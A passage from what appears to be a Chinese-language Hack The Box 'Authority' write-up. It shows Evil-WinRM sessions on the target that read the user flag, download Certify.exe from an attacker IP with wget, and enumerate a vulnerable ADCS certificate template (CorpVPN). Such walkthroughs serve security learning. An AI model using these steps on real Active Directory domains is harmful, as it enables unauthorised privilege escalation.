</span><span id="__span-14-49"><a id="__codelineno-14-49" name="__codelineno-14-49" href="#__codelineno-14-49"></a>Kerberos<span class="w"> </span>support<span class="w"> </span><span class="k">for</span><span class="w"> </span>Dynamic<span class="w"> </span>Access<span class="w"> </span>Control<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>device<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>disabled.
</span></code></pre></div></p>
<ul>
<li>值得注意的是，这个用户有 <code>SeMachineAccountPrivilege     Add workstations to domain</code> 权限，即可以将新机器加入域。</li>
</ul>
<h2 id="flag-user">flag: user<a class="headerlink" href="#flag-user" title="Permanent link">&para;</a></h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">dir</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Desktop</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">-ar</span><span class="p">---</span>        <span class="n">7</span><span class="p">/</span><span class="n">20</span><span class="p">/</span><span class="n">2023</span>  <span class="n">10</span><span class="p">:</span><span class="n">09</span> <span class="n">AM</span>             <span class="n">34</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">user</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="n">1ef3</span><span class="err">（</span><span class="n">略</span><span class="err">）</span><span class="n">6483</span>
</span></code></pre></div>
<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
<h3 id="_3">探索<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p>因为之前在SMB发现ansible里有ADCS文件夹，而在靶机C盘也发现名为 <code>Certs</code> 的目录，应该可以使用 <code>certify</code> 工具搜索易受攻击的证书。</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">dir</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">4</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2023</span>   <span class="n">6</span><span class="p">:</span><span class="n">16</span> <span class="n">PM</span>                <span class="n">Certs</span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">3</span><span class="p">/</span><span class="n">28</span><span class="p">/</span><span class="n">2023</span>   <span class="n">1</span><span class="p">:</span><span class="n">59</span> <span class="n">PM</span>                <span class="n">Department</span> <span class="n">Shares</span>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">3</span><span class="p">/</span><span class="n">17</span><span class="p">/</span><span class="n">2023</span>   <span class="n">9</span><span class="p">:</span><span class="n">20</span> <span class="n">AM</span>                <span class="n">Development</span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="n">d</span><span class="p">-----</span>         <span class="n">8</span><span class="p">/</span><span class="n">9</span><span class="p">/</span><span class="n">2022</span>   <span class="n">7</span><span class="p">:</span><span class="n">00</span> <span class="n">PM</span>                <span class="n">inetpub</span>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">3</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2023</span>   <span class="n">8</span><span class="p">:</span><span class="n">22</span> <span class="n">PM</span>                <span class="n">PerfLogs</span>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="n">d-r</span><span class="p">---</span>        <span class="n">3</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2023</span>   <span class="n">1</span><span class="p">:</span><span class="n">20</span> <span class="n">AM</span>                <span class="n">Program</span> <span class="n">Files</span>
</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">3</span><span class="p">/</span><span class="n">25</span><span class="p">/</span><span class="n">2023</span>   <span class="n">1</span><span class="p">:</span><span class="n">19</span> <span class="n">AM</span>                <span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">7</span><span class="p">/</span><span class="n">20</span><span class="p">/</span><span class="n">2023</span>  <span class="n">11</span><span class="p">:</span><span class="n">52</span> <span class="n">AM</span>                <span class="n">pwm</span>
</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="n">d-r</span><span class="p">---</span>        <span class="n">3</span><span class="p">/</span><span class="n">24</span><span class="p">/</span><span class="n">2023</span>  <span class="n">11</span><span class="p">:</span><span class="n">27</span> <span class="n">PM</span>                <span class="n">Users</span>
</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="n">d</span><span class="p">-----</span>        <span class="n">7</span><span class="p">/</span><span class="n">12</span><span class="p">/</span><span class="n">2023</span>   <span class="n">1</span><span class="p">:</span><span class="n">19</span> <span class="n">PM</span>                <span class="n">Windows</span>
</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="n">-a</span><span class="p">----</span>        <span class="n">8</span><span class="p">/</span><span class="n">10</span><span class="p">/</span><span class="n">2022</span>   <span class="n">8</span><span class="p">:</span><span class="n">44</span> <span class="n">PM</span>       <span class="n">84784749</span> <span class="n">pwm-onejar</span><span class="p">-</span><span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">jar</span>
</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>
</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Certs</span><span class="p">&gt;</span> <span class="nb">dir</span>
</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>
</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>
</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Certs</span>
</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a>
</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a>
</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a><span class="n">-a</span><span class="p">----</span>        <span class="n">4</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2023</span>   <span class="n">6</span><span class="p">:</span><span class="n">11</span> <span class="n">PM</span>           <span class="n">4933</span> <span class="n">LDAPs</span><span class="p">.</span><span class="n">pfx</span>
</span></code></pre></div>
<h3 id="ca">CA模板漏洞<a class="headerlink" href="#ca" title="Permanent link">&para;</a></h3>
<h4 id="certify">Certify搜索漏洞模板<a class="headerlink" href="#certify" title="Permanent link">&para;</a></h4>
<p>在<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>可下载编译好的 <code>Certify.exe</code>，上传到目标机。
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Downloads</span><span class="p">&gt;</span> <span class="nb">wget </span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">106</span><span class="p">:</span><span class="n">80</span><span class="p">/</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">Certify</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Downloads</span><span class="p">&gt;</span> <span class="nb">dir</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Downloads</span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="p">----</span>                <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="n">-a</span><span class="p">----</span>        <span class="n">7</span><span class="p">/</span><span class="n">20</span><span class="p">/</span><span class="n">2023</span>  <span class="n">12</span><span class="p">:</span><span class="n">18</span> <span class="n">PM</span>         <span class="n">174080</span> <span class="n">Certify</span><span class="p">.</span><span class="n">exe</span>
</span></code></pre></div></p>
<p>运行命令后发现一个名为 <code>CorpVPN</code> 的漏洞模板：
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">svc_ldap</span><span class="p">\</span><span class="n">Downloads</span><span class="p">&gt;</span> <span class="p">./</span><span class="n">Certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>  <span class="p">/</span> <span class="n">____</span><span class="p">|</span>        <span class="p">|</span> <span class="p">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)/</span> <span class="n">_</span><span class="p">|</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a> <span class="p">|</span> <span class="p">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span><span class="p">|</span> <span class="p">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a> <span class="p">|</span> <span class="p">|</span>    <span class="p">/</span> <span class="n">_</span> <span class="p">\</span> <span class="s1">&#39;__| __| |  _| | | |</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="s1"> | |___|  __/ |  | |_| | | | |_| |</span>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="s1">  \_____\___|_|   \__|_|_|  \__, |</span>
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="s1">                             __/ |</span>
</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="s1">                            |___./</span>
</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="s1">  v1.0.0</span>
</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>
</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="s1">[*] Action: Find certificate templates</span>
</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="s1">[*] Using the search base &#39;</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span><span class="s1">&#39;</span>
</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>
</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="s1">[*] Listing info about the Enterprise CA &#39;</span><span class="n">AUTHORITY-CA</span><span class="err">&#39;</span>
</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>
</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>    <span class="n">Enterprise</span> <span class="n">CA</span> <span class="n">Name</span>            <span class="p">:</span> <span class="n">AUTHORITY-CA</span>
</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>    <span class="n">DNS</span> <span class="n">Hostname</span>                  <span class="p">:</span> <span class="n">authority</span><span class="p">.</span><span class="n">authority</span><span class="p">.</span><span class="n">htb</span>
</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>    <span class="n">FullName</span>                      <span class="p">:</span> <span class="n">authority</span><span class="p">.</span><span class="n">authority</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">AUTHORITY-CA</span>
</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>    <span class="n">Flags</span>                         <span class="p">:</span> <span class="n">SUPPORTS_NT_AUTHENTICATION</span><span class="p">,</span> <span class="n">CA_SERVERTYPE_ADVANCED</span>
</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a>    <span class="n">Cert</span> <span class="n">SubjectName</span>              <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">AUTHORITY-CA</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">authority</span><span class="p">,</span> <span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>    <span class="n">Cert</span> <span class="n">Thumbprint</span>               <span class="p">:</span> <span class="n">42A80DC79DD9CE76D032080B2F8B172BC29B0182</span>
</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>    <span class="n">Cert</span> <span class="n">Serial</span>                   <span class="p">:</span> <span class="n">2C4E1F3CA46BBDAF42A1DDE3EC33A6B4</span>
</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>    <span class="n">Cert</span> <span class="nb">Start </span><span class="n">Date</span>               <span class="p">:</span> <span class="n">4</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2023</span> <span class="n">9</span><span class="p">:</span><span class="n">46</span><span class="p">:</span><span class="n">26</span> <span class="n">PM</span>
</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>    <span class="n">Cert</span> <span class="k">End</span> <span class="n">Date</span>                 <span class="p">:</span> <span class="n">4</span><span class="p">/</span><span class="n">23</span><span class="p">/</span><span class="n">2123</span> <span class="n">9</span><span class="p">:</span><span class="n">56</span><span class="p">:</span><span class="n">25</span> <span class="n">PM</span>
</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>    <span class="n">Cert</span> <span class="n">Chain</span>                    <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">AUTHORITY-CA</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">authority</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>
</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a>    <span class="n">UserSpecifiedSAN</span>              <span class="p">:</span> <span class="n">Disabled</span>
</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>    <span class="n">CA</span> <span class="n">Permissions</span>                <span class="p">:</span>
</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a>      <span class="n">Owner</span><span class="p">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a>
</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a>      <span class="n">Access</span> <span class="n">Rights</span>                                     <span class="n">Principal</span>
</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a>
</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a>      <span class="n">Allow</span>  <span class="n">Enroll</span>                                     <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">UsersS</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">11</span>
</span><span id="__span-18-35"><a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a>      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>        <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">32</span><span class="p">-</span><span class="n">544</span>
</span><span id="__span-18-36"><a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a>      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">HTB</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>             <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">512</span>
</span><span id="__span-18-37"><a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a>      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">HTB</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>         <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">622327497</span><span class="p">-</span><span class="n">3269355298</span><span class="p">-</span><span class="n">2248959698</span><span class="p">-</span><span class="n">519</span>
</span><span id="__span-18-38"><a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a>    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="n">None</span>
</span><span id="__span-18-39"><a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a>
</span><span id="__span-18-40"><a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a><span class="p">[!]</span> <span class="n">Vulnerable</span> <span class="n">Certificates</span> <span class="n">Templates</span> <span class="p">:</span>
</span><span id="__span-18-41"><a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a>
</span><span id="__span-18-42"><a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a>    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">authority</span><span class="p">.</span><span class="n">authority</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">AUTHORITY-CA</span>
</span><span id="__span-18-43"><a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a>    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">CorpVPN</span>
</span><span id="__span-18-44"><a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a>    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">2</span>
</span><span id="__span-18-45"><a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a>    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">20</span> <span class="n">years</span>
</span><span id="__span-18-46"><a id="__codelineno-18-46" name="__codelineno-18-46" href="#__codelineno-18-46"></a>    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
</span><span id="__span-18-47"><a id="__codelineno-18-47" name="__codelineno-18-47" href="#__codelineno-18-47"></a>    <span class="n">msPKI-Certificate-Name-Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
</span><span id="__span-18-48"><a id="__codelineno-18-48" name="__codelineno-18-48" href="#__codelineno-18-48"></a>    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span> <span class="n">PUBLISH_TO_DS</span><span class="p">,</span> <span class="n">AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE</span>
</span><span id="__span-18-49"><a id="__codelineno-18-49" name="__codelineno-18-49" href="#__codelineno-18-49"></a>    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">0</span>
</span><span id="__span-18-50"><a id="__codelineno-18-50" name="__codelineno-18-50" href="#__codelineno-18-50"></a>    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Document</span> <span class="n">Signing</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">IP</span> <span class="n">security</span> <span class="n">IKE</span> <span class="n">intermediate</span><span class="p">,</span> <span class="n">IP</span> <span class="n">security</span> <span class="n">user</span><span class="p">,</span> <span class="n">KDC</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
</span><span id="__span-18-51"><a id="__codelineno-18-51" name="__codelineno-18-51" href="#__codelineno-18-51"></a>    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Document</span> <span class="n">Signing</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">IP</span> <span class="n">security</span> <span class="n">IKE</span> <span class="n">intermediate</span><span class="p">,</span> <span class="n">IP</span> <span class="n">security</span> <span class="n">user</span><span class="p">,</span> <span class="n">KDC</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
</span><span id="__span-18-52"><a id="__codelineno-18-52" name="__codelineno-18-52" href="#__codelineno-18-52"></a>    <span class="n">Permissions</span>
</span><span id="__span-18-53"><a id="__codelineno-18-53" name="__codelineno-18-53" href="#__codelineno-18-53"></a>      <span class="n">Enrollment</span> <span class="n">Permissions</span>
